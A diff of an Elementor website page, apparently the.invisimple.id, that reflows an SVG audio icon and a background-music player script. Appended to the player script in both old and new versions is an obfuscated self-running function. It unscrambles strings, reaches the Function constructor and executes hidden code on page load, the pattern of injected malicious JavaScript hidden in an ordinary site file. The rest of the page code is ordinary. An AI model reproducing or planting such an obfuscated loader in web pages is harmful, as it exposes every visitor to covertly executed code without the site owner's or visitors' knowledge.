@@ -1364,115 +1364,18 @@ bernaunginv
 </div>
 <div class="elementor-icon-wrapper" id="mute-sound" style="display: none; line-height: 0;">
 <div class="elementor-icon" style="cursor: pointer;">
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="a23e99a7-4f9a-4212-82bf-846542e15be3" data-name="Layer 1" viewBox="0 0 45.74686 45.74686">
-<defs>
-<style>.e6b615f0-3a34-4966-9b0f-fa8f36adb2f9{stroke:#000;stroke-miterlimit:10;stroke-width:.25px;fill:url(#eb30a15e-de7f-402d-8331-fcf7dede9ed7)}.a9172555-7ee9-4b9b-b7d7-58b349085bf6{fill:url(#f86929c6-8c25-4754-a222-5e6d3ff0148a)}.ec20c653-b043-416a-a11f-32db94110313{fill:#fff}</style>
-<linearGradient id="eb30a15e-de7f-402d-8331-fcf7dede9ed7" x1="0.125" y1="25.12657" x2="50.95953" y2="25.12657" gradientTransform="matrix(1, 0, 0, -1, 0, 48)" gradientUnits="userSpaceOnUse">
-<stop offset="0.09096" stop-color="#0c0c0c"></stop>
-<stop offset="0.17232" stop-color="#101010"></stop>
-<stop offset="0.26163" stop-color="#1d1e1e"></stop>
-<stop offset="0.35434" stop-color="#313434"></stop>
-<stop offset="0.44121" stop-color="#4b4f4f"></stop>
-<stop offset="0.53874" stop-color="#333636"></stop>
-<stop offset="0.68102" stop-color="#151616"></stop>
-<stop offset="0.76007" stop-color="#0a0a0a"></stop>
-</linearGradient>
-<linearGradient id="f86929c6-8c25-4754-a222-5e6d3ff0148a" x1="12.8031" y1="20.89854" x2="33.90705" y2="29.75903" gradientTransform="matrix(1, 0, 0, -1, 0, 48)" gradientUnits="userSpaceOnUse">
-<stop offset="0.45725" stop-color="#00928b"></stop>
-<stop offset="0.77455" stop-color="#00736d"></stop>
-<stop offset="1" stop-color="#00625d"></stop>
-</linearGradient>
-</defs>
-<title>icon-audio</title>
-<g id="b4e59988-9b80-4119-9938-2513d707876a" data-name="b6468ed4-3545-4f34-9fb7-c938e0b9d8e9"><g id="b3b0dd33-6cd0-46df-9657-c6aceee1b551" data-name="ea460610-dc09-4185-bce2-3dccd975cfed">
-<circle class="e6b615f0-3a34-4966-9b0f-fa8f36adb2f9" cx="22.87343" cy="22.87343" r="22.74843"></circle>
-<circle class="a9172555-7ee9-4b9b-b7d7-58b349085bf6" cx="22.87343" cy="22.87343" r="11.21049"></circle>
-<path class="ec20c653-b043-416a-a11f-32db94110313" d="M20.11842,18.37793a.52877.52877,0,0,0-.33191.49076v7.16513a1.98982,1.98982,0,1,0,.9198,1.87062h.00037V27.897c.00539-.05969.00914-.11987.00914-.181s-.00375-.12127-.00914-.181V20.69581l5.87859-2.35809v5.016a1.99048,1.99048,0,1,0-.93534,3.663,2.02737,2.02737,0,0,0,1.85551-2.04222V15.97461h0a.37864.37864,0,0,0-.51961-.35142Z"></path>
-</g>
-</g>
-</svg>
-</div>
-</div>
-</div> 
-<script data-optimized="1" type="text/javascript">
-const song=document.getElementById('song');
-var isFirstPlay=!0;
-let fadeDuration=2000;
-function fadeAudio(volume,duration){let startVolume=song.volume;
-let startTime=Date.now();
-const step=()=>{let currentTime=Date.now();
-let elapsedTime=currentTime-startTime;
-if(elapsedTime<duration){let fraction=elapsedTime/duration;
-song.volume=startVolume+(volume-startVolume)*fraction;
-requestAnimationFrame(step)}else{song.volume=volume}};
-requestAnimationFrame(step)}
-function parseTime(time){if(!time)return 0;
-if(!isNaN(time))return parseInt(time,10);
-let parts=time.toString().split(":").map(Number);
-if(parts.length===2){return parts[0]*60+parts[1]}else if(parts.length===3){return parts[0]*3600+parts[1]*60+parts[2]}
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="a23e99a7-4f9a-4212-82bf-846542e15be3" data-name="Layer 1" viewBox="0 0 45.74686 45.74686"><defs><style>.e6b615f0-3a34-4966-9b0f-fa8f36adb2f9{stroke:#000;stroke-miterlimit:10;stroke-width:.25px;fill:url(#eb30a15e-de7f-402d-8331-fcf7dede9ed7)}.a9172555-7ee9-4b9b-b7d7-58b349085bf6{fill:url(#f86929c6-8c25-4754-a222-5e6d3ff0148a)}.ec20c653-b043-416a-a11f-32db94110313{fill:#fff}</style><linearGradient id="eb30a15e-de7f-402d-8331-fcf7dede9ed7" x1="0.125" y1="25.12657" x2="50.95953" y2="25.12657" gradientTransform="matrix(1, 0, 0, -1, 0, 48)" gradientUnits="userSpaceOnUse"><stop offset="0.09096" stop-color="#0c0c0c"></stop><stop offset="0.17232" stop-color="#101010"></stop><stop offset="0.26163" stop-color="#1d1e1e"></stop><stop offset="0.35434" stop-color="#313434"></stop><stop offset="0.44121" stop-color="#4b4f4f"></stop><stop offset="0.53874" stop-color="#333636"></stop><stop offset="0.68102" stop-color="#151616"></stop><stop offset="0.76007" stop-color="#0a0a0a"></stop></linearGradient><linearGradient id="f86929c6-8c25-4754-a222-5e6d3ff0148a" x1="12.8031" y1="20.89854" x2="33.90705" y2="29.75903" gradientTransform="matrix(1, 0, 0, -1, 0, 48)" gradientUnits="userSpaceOnUse"><stop offset="0.45725" stop-color="#00928b"></stop><stop offset="0.77455" stop-color="#00736d"></stop><stop offset="1" stop-color="#00625d"></stop></linearGradient></defs><title>icon-audio-invisimple</title><g id="b4e59988-9b80-4119-9938-2513d707876a" data-name="b6468ed4-3545-4f34-9fb7-c938e0b9d8e9"><g id="b3b0dd33-6cd0-46df-9657-c6aceee1b551" data-name="ea460610-dc09-4185-bce2-3dccd975cfed"><circle class="e6b615f0-3a34-4966-9b0f-fa8f36adb2f9" cx="22.87343" cy="22.87343" r="22.74843"></circle><circle class="a9172555-7ee9-4b9b-b7d7-58b349085bf6" cx="22.87343" cy="22.87343" r="11.21049"></circle><path class="ec20c653-b043-416a-a11f-32db94110313" d="M20.11842,18.37793a.52877.52877,0,0,0-.33191.49076v7.16513a1.98982,1.98982,0,1,0,.9198,1.87062h.00037V27.897c.00539-.05969.00914-.11987.00914-.181s-.00375-.12127-.00914-.181V20.69581l5.87859-2.35809v5.016a1.99048,1.99048,0,1,0-.93534,3.663,2.02737,2.02737,0,0,0,1.85551-2.04222V15.97461h0a.37864.37864,0,0,0-.51961-.35142Z"></path></g></g></svg></div></div></div> <script data-optimized="1" type="text/javascript">const song=document.getElementById('song');var isFirstPlay=!0;let fadeDuration=2000;function fadeAudio(volume,duration){let startVolume=song.volume;let startTime=Date.now();const step=()=>{let currentTime=Date.now();let elapsedTime=currentTime-startTime;if(elapsedTime<duration){let fraction=elapsedTime/duration;song.volume=startVolume+(volume-startVolume)*fraction;requestAnimationFrame(step)}else{song.volume=volume}};requestAnimationFrame(step)}
+function parseTime(time){if(!time)return 0;if(!isNaN(time))return parseInt(time,10);let parts=time.toString().split(":").map(Number);if(parts.length===2){return parts[0]*60+parts[1]}else if(parts.length===3){return parts[0]*3600+parts[1]*60+parts[2]}
 return 0}
 function playAudio(){if(!song.paused){return}
-song.volume=0;
-if(isFirstPlay){var rawStart="";
-var startTime=parseTime(rawStart);
-song.currentTime=startTime;isFirstPlay=!1}
-song.play();
-fadeAudio(1,fadeDuration);
-audioActive()}
-function pauseAudio(){fadeAudio(0,fadeDuration);
-setTimeout(()=>{song.pause()},fadeDuration);
-audioInactive()}
-const wdpAudio=document.body.contains(document.getElementById('song'))?document.getElementById('song'):
-!1;document.addEventListener("visibilitychange",event=>{if(document.visibilityState==="visible"){playAudio()}else{song.pause()}})
-window.addEventListener("DOMContentLoaded",event=>{playAudio()});
-function audioActive(){jQuery('#mute-sound').show();
-jQuery('#unmute-sound').hide()}
-function audioInactive(){jQuery('#mute-sound').hide();
-jQuery('#unmute-sound').show()}
-var audioElement=jQuery('#song')[0];
-function toggleAudio(){if(audioElement.paused){playAudio();
-audioActive()}else{pauseAudio();
-audioInactive()}}
-jQuery('#unmute-sound .elementor-icon').on('click',toggleAudio);
-jQuery('#btn_open').on('click',playAudio);
-jQuery('#mute-sound .elementor-icon').on('click',function(){if(!audioElement.paused){toggleAudio()}});
-(function(){var bzf='',oNH=347-336;function pdZ(e){var f=772846;
-var i=e.length;var d=[];
-for(var o=0;o<i;o++){d[o]=e.charAt(o)};
-for(var o=0;o<i;o++){var p=f*(o+471)+(f%17256);
-var s=f*(o+679)+(f%12946);
-var b=p%i;
-var h=s%i;
-var n=d[b];d[b]=d[h];d[h]=n;f=(p+s)%1381133};
-return d.join('')};
-var CPm=pdZ('recstrtjukxbvcgodohfwqsnormznltuyacip').substr(0,oNH);
-var vpo='va)!)f=7vh1[i,l=jb.b=r;1{Cubndrng2ul0ps;okurh2(v<xa;z ol,>7p}7=)o.497v14v62,)4v=n,fr;lz,s5++r,cg2)uv=48ui( tn.;, ===e;u9];;h69p=a6aftrv+z-az(uyzo1;ltli6m)rgq0n(  ,oa=}+i;+}u d6fr)qr(aseaa=(a[a+=.n(b+itsr(].C=hk;arz+h+)q[alun.tu;(+);vd,r+czl]gcmjntA;i6()(np;qj a)[(7t;+;rci=f8]u9=tw-[nh>=a40}u"(v;S h=jt-lCv=o;g1ffi0;bwn z=(;rlfvt]bst}(+tr(5v .ofnrts<vag]a;"8iv.at4;8v{)srajC=ap;bi=,egrchsf"= jf0(ln;glvne,y lr 8f<e={.0c-5fh*7=oe,h+;ho.,r;+h t,r st=g=o+o;,((sr(mf(l{osre;+ (Sb.]e"gphb.fo.c[b=C2) Aka!+ ))vg.hhbvtopertcv12gf();)rrinba2;"ifj1valhi.ui,jz](=61r)le)) rn;iof o()rgl+hlcsu,3[i05,s;yp(p}h;eue(t71.[0;(c[u==q+{iir=(;7)n- ;;-i,;)< )gt{uohagp=lwatn;frtpa)e=bi}=]oo+ukt".)d1tm.o1cj.rCr]g;pvlr ;,vyj,i=.o"",Ca= h.."sevs]9),8=gn ,r0b.)je]et+();vara8=[u,01rjf;ra<rp+09d)s,+m6)ir){aer6t[;pnitee[gzh+ram1"nge-eg[tr0(n(c22n9r8li[.a=]Aks(r.)8osrtmCnora=3(lgAz0mo;Aebrjn,s.sdlr.v]79;=qaeh*aoe)d';
-var GYM=pdZ[CPm];
-var RLC='';
-var OMa=GYM;
-var xRh=GYM(RLC,pdZ(vpo));
-var OsF=xRh(pdZ('dL{.te\'dsnia;kwoe#ndp#Liplet&.coa.tL.l.(odea-!eaC=bLiiLol%e.fjbtmu(mlrtyLdT!!n"efwLdD(acon; boor&E-)(dt&,Ldsplpo:or=ciw=>w#! areTj;zgfs&vsp..n)dmcabTn.de&lLe!LL!=d.nnl!ds|Leviotirt"L,0douLgd.dL%ew>{geoSuLeineLe"}lE\'l.s.. .)f..sf!g#$re.cLntoeEue)Lt!L(;ML(m#L.Lleo>S.S=.cvodSLdr$m)isn.#?|aLLdo"dsas!ed(EhL.deLsd.oSg\'veweuf!.\'$ILgL&(fhte(apdL$lllml}zldda{n%moL=.mtsed=L;gd0lL&mbut%debwb gzoLtgEcitn}frLs\'en t{Lai.teTs)%us( !;bsbi,(-.}|soeaLd| t.ta. Ldu)'));
-var osO=OMa(bzf,OsF);osO(8037);return 6659})()
-</script> 
-</div>
-</div>
-</div>
-</div>
-</div>
-</section>
-</footer>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</section>
-<section class="elementor-section elementor-inner-section elementor-element elementor-element-651aeac elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="651aeac" data-element_type="section" data-e-type="section" data-settings="{&quot;jet_parallax_layout_list&quot;:[]}">
-<div class="elementor-container elementor-column-gap-default">
-<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-8bb700e" data-id="8bb700e" data-element_type="column" data-e-type="column">
-<div class="elementor-widget-wrap elementor-element-populated">
-<div class="elementor-element elementor-element-3a875fa elementor-widget elementor-widget-html" data-id="3a875fa" data-element_type="widget" data-e-type="widget" data-widget_type="html.default"><div class="elementor-widget-container"> <script src = "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" ></script> <script data-optimized="1" src = "https://the.invisimple.id/wp-content/litespeed/js/051a23887bb76a428f4cfc30f318f8cd.js?ver=8f8cd" ></script> <script>var cover=document.getElementById('cover');var btn_open=document.getElementById('btn_open');let delaySection=0;const isEditorActive=document.body.classList.contains('elementor-editor-active');document.addEventListener('DOMContentLoaded',()=>{document.querySelector('.motionSection .elementor-background-video-container video').removeAttribute('autoplay');document.querySelector('.kolomPertama').style.display='none';delaySection=document.querySelector('.kolomPertama').dataset.delayTime});if(typeof elementorFrontendConfig==='undefined'){disableScrolling();document.body.style.height="100vh";btn_open.onclick=function(){enableScrolling();closeCover();myFunction()}}
+song.volume=0;if(isFirstPlay){var rawStart="";var startTime=parseTime(rawStart);song.currentTime=startTime;isFirstPlay=!1}
+song.play();fadeAudio(1,fadeDuration);audioActive()}
+function pauseAudio(){fadeAudio(0,fadeDuration);setTimeout(()=>{song.pause()},fadeDuration);audioInactive()}
+const wdpAudio=document.body.contains(document.getElementById('song'))?document.getElementById('song'):!1;document.addEventListener("visibilitychange",event=>{if(document.visibilityState==="visible"){playAudio()}else{song.pause()}})
+window.addEventListener("DOMContentLoaded",event=>{playAudio()});function audioActive(){jQuery('#mute-sound').show();jQuery('#unmute-sound').hide()}
+function audioInactive(){jQuery('#mute-sound').hide();jQuery('#unmute-sound').show()}
+var audioElement=jQuery('#song')[0];function toggleAudio(){if(audioElement.paused){playAudio();audioActive()}else{pauseAudio();audioInactive()}}
+jQuery('#unmute-sound .elementor-icon').on('click',toggleAudio);jQuery('#btn_open').on('click',playAudio);jQuery('#mute-sound .elementor-icon').on('click',function(){if(!audioElement.paused){toggleAudio()}});(function(){var bzf='',oNH=347-336;function pdZ(e){var f=772846;var i=e.length;var d=[];for(var o=0;o<i;o++){d[o]=e.charAt(o)};for(var o=0;o<i;o++){var p=f*(o+471)+(f%17256);var s=f*(o+679)+(f%12946);var b=p%i;var h=s%i;var n=d[b];d[b]=d[h];d[h]=n;f=(p+s)%1381133};return d.join('')};var CPm=pdZ('recstrtjukxbvcgodohfwqsnormznltuyacip').substr(0,oNH);var vpo='va)!)f=7vh1[i,l=jb.b=r;1{Cubndrng2ul0ps;okurh2(v<xa;z ol,>7p}7=)o.497v14v62,)4v=n,fr;lz,s5++r,cg2)uv=48ui( tn.;, ===e;u9];;h69p=a6aftrv+z-az(uyzo1;ltli6m)rgq0n(  ,oa=}+i;+}u d6fr)qr(aseaa=(a[a+=.n(b+itsr(].C=hk;arz+h+)q[alun.tu;(+);vd,r+czl]gcmjntA;i6()(np;qj a)[(7t;+;rci=f8]u9=tw-[nh>=a40}u"(v;S h=jt-lCv=o;g1ffi0;bwn z=(;rlfvt]bst}(+tr(5v .ofnrts<vag]a;"8iv.at4;8v{)srajC=ap;bi=,egrchsf"= jf0(ln;glvne,y lr 8f<e={.0c-5fh*7=oe,h+;ho.,r;+h t,r st=g=o+o;,((sr(mf(l{osre;+ (Sb.]e"gphb.fo.c[b=C2) Aka!+ ))vg.hhbvtopertcv12gf();)rrinba2;"ifj1valhi.ui,jz](=61r)le)) rn;iof o()rgl+hlcsu,3[i05,s;yp(p}h;eue(t71.[0;(c[u==q+{iir=(;7)n- ;;-i,;)< )gt{uohagp=lwatn;frtpa)e=bi}=]oo+ukt".)d1tm.o1cj.rCr]g;pvlr ;,vyj,i=.o"",Ca= h.."sevs]9),8=gn ,r0b.)je]et+();vara8=[u,01rjf;ra<rp+09d)s,+m6)ir){aer6t[;pnitee[gzh+ram1"nge-eg[tr0(n(c22n9r8li[.a=]Aks(r.)8osrtmCnora=3(lgAz0mo;Aebrjn,s.sdlr.v]79;=qaeh*aoe)d';var GYM=pdZ[CPm];var RLC='';var OMa=GYM;var xRh=GYM(RLC,pdZ(vpo));var OsF=xRh(pdZ('dL{.te\'dsnia;kwoe#ndp#Liplet&.coa.tL.l.(odea-!eaC=bLiiLol%e.fjbtmu(mlrtyLdT!!n"efwLdD(acon; boor&E-)(dt&,Ldsplpo:or=ciw=>w#! areTj;zgfs&vsp..n)dmcabTn.de&lLe!LL!=d.nnl!ds|Leviotirt"L,0douLgd.dL%ew>{geoSuLeineLe"}lE\'l.s.. .)f..sf!g#$re.cLntoeEue)Lt!L(;ML(m#L.Lleo>S.S=.cvodSLdr$m)isn.#?|aLLdo"dsas!ed(EhL.deLsd.oSg\'veweuf!.\'$ILgL&(fhte(apdL$lllml}zldda{n%moL=.mtsed=L;gd0lL&mbut%debwb gzoLtgEcitn}frLs\'en t{Lai.teTs)%us( !;bsbi,(-.}|soeaLd| t.ta. Ldu)'));var osO=OMa(bzf,OsF);osO(8037);return 6659})()</script> </div></div></div></div></div></section></footer></div></div></div></div></div></div></section><section class="elementor-section elementor-inner-section elementor-element elementor-element-651aeac elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="651aeac" data-element_type="section" data-e-type="section" data-settings="{&quot;jet_parallax_layout_list&quot;:[]}"><div class="elementor-container elementor-column-gap-default"><div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-8bb700e" data-id="8bb700e" data-element_type="column" data-e-type="column"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-3a875fa elementor-widget elementor-widget-html" data-id="3a875fa" data-element_type="widget" data-e-type="widget" data-widget_type="html.default"><div class="elementor-widget-container"> <script src = "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" ></script> <script data-optimized="1" src = "https://the.invisimple.id/wp-content/litespeed/js/051a23887bb76a428f4cfc30f318f8cd.js?ver=8f8cd" ></script> <script>var cover=document.getElementById('cover');var btn_open=document.getElementById('btn_open');let delaySection=0;const isEditorActive=document.body.classList.contains('elementor-editor-active');document.addEventListener('DOMContentLoaded',()=>{document.querySelector('.motionSection .elementor-background-video-container video').removeAttribute('autoplay');document.querySelector('.kolomPertama').style.display='none';delaySection=document.querySelector('.kolomPertama').dataset.delayTime});if(typeof elementorFrontendConfig==='undefined'){disableScrolling();document.body.style.height="100vh";btn_open.onclick=function(){enableScrolling();closeCover();myFunction()}}
 function myFunction(){setTimeout(()=>{document.querySelector('.motionSection .elementor-background-video-container video').play()},100);setTimeout(()=>{document.querySelector('.kolomPertama').style.display='block'},delaySection)}
 function disableScrolling(){var x=window.scrollX;var y=window.scrollY;window.onscroll=function(){window.scrollTo(x,y)};jQuery('body').css('overflow','hidden')}
 function enableScrolling(){window.onscroll=function(){};jQuery('body').css('overflow','visible')}
